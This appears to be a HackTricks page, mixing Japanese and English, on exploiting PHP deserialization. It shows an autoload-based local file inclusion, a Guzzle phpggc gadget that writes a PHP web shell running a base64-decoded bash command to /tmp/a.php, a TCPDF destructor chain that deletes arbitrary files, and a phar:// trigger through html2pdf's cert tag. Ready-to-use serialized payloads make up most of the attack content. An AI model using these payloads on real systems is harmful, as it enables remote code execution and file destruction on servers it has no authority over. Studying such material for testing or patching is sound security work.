# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

まず、[**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) が何かを確認してください。

## PHP deserialization + spl_autoload_register + LFI/Gadget

ある状況で、webapp 内で **PHP deserialization** を発見しましたが、**`phpggc`** 内にあるような gadget に対して脆弱なライブラリは **no** でした。しかし同じコンテナ内に脆弱なライブラリを含む **別の composer webapp** が存在しました。したがって目的は、**他の webapp の composer loader をロード**し、それを悪用して deserialization に脆弱な webapp 側のライブラリを悪用する gadget を **ロードする**ことでした。

Steps:

- あなたは **deserialization** を発見し、現在のアプリのコード内には **isn’t any gadget** がありません
- 次のような **`spl_autoload_register`** 関数を悪用して、**load any local file with `.php` extension** ことができます
- そのためにクラス名が **`$name`** の中に入るような deserialization を使います。シリアライズされたオブジェクトのクラス名では **cannot use "/" or "."** が使えませんが、**code** は **replacing** the **underscores** ("\_") **for slashes** ("/")。なのでクラス名 `tmp_passwd` は `/tmp/passwd.php` に変換され、コードはそれを読み込もうとします。\
gadget の例は: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> If you have a **file upload** and can upload a file with **`.php` extension`** you could **abuse this functionality directly** and get already RCE.

In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- 今回、**ファイルを作成して書き込む**ことができますが、ユーザーは **web server 内のどのフォルダにも書き込めませんでした**。そのため、payload を見ると、PHP が **`system`** を呼び、いくつかの **base64** とともに **`/tmp/a.php`** に作成されているのがわかります。次に、LFI として使用した **最初のタイプの payload** を再利用して、他の webapp の composer loader をロードし、t**生成した `/tmp/a.php` を読み込む** ファイルを読み込ませることができます。単にそれを deserialization gadget に追加します:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**ペイロードの概要**

- **Load the composer autoload** of a different webapp in the same container
- **Load a phpggc gadget** to abuse a library from the other webapp (the initial webapp vulnerable to deserialization didn’t have any gadget on its libraries)
- The gadget will **create a file with a PHP payload** on it in /tmp/a.php with malicious commands (the webapp user cannot write in any folder of any webapp)
- The final part of our payload will use **load the generated php file** that will execute commands

I needed to **call this deserialization twice**. In my testing, the first time the `/tmp/a.php` file was created but not loaded, and the second time it was correctly loaded.

## TCPDF `__destruct` POP chain for arbitrary file deletion

When a real `TCPDF` instance is garbage-collected it calls `_destroy(true)`, iterates over `$this->imagekeys`, and `unlink()`s anything that looks like a cache file under `K_PATH_CACHE`. If an application performs `unserialize($user_data)` while the `TCPDF` class is loaded (e.g. it expects an array with an `html` key), you can supply a serialized object that sets:

- `file_id` to any integer that is not present in `self::$cleaned_ids` (e.g. `-1`).
- `imagekeys` to paths that begin with `K_PATH_CACHE` or that can be made to look like it (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
ファイルはオブジェクトがスコープ外になると直ちに削除されます。TCPDF 6.9.3 ではチェックが強化され、`K_PATH_CACHE` 内で `__tcpdf_<file_id>_` プレフィックスを持つパスのみを削除するようになり、非 `file://` スキームを遮断するために `_unlink()` が導入されました。そのため古い `Producer` バージョンは格好の標的です。

### html2pdf `<cert>` タグ内の `phar://` を介した gadget のトリガー

`spipu/html2pdf` (≤5.3.0) は TCPDF をラップし、`src`/`privkey` 属性を plain な `file_exists()` で検証するカスタム `<cert>` ブロックを公開します。PHP < 8.0 では `phar://` URL に触れる任意のファイルシステム関数が Phar のメタデータを `unserialize()` させます。上記の悪意ある TCPDF オブジェクトを Phar アーカイブのメタデータに格納することで、アプリケーションが自ら `unserialize()` を呼ばなくても信頼性の高い POP を得られます。

1. `phar.readonly=0` で Phar を作成し、stub/manifest を画像に見えるように設定（例: リネームして `archive.phar` を `archive.png` にする）、そしてシリアライズした TCPDF オブジェクトを Phar のメタデータに格納する。
2. `/tmp/user_files/user_1/archive.png` のように到達可能な場所にファイルをアップロード／配置する。
3. html2pdf が攻撃者制御のパスを解決するよう `<cert>` タグを含む HTML を送信する:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
`file_exists()` の呼び出しはメタデータをデシリアライズし、TCPDF をインスタンス化し、そのデストラクタが選択されたファイルを削除することで、html2pdf を強力な `phar://` エントリポイントに変える。バージョン 5.3.1 では未承認のスキームをブロックするために `Security::checkValidPath()` が追加されたため、レガシーな導入は依然として魅力的である。

## 参考文献

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
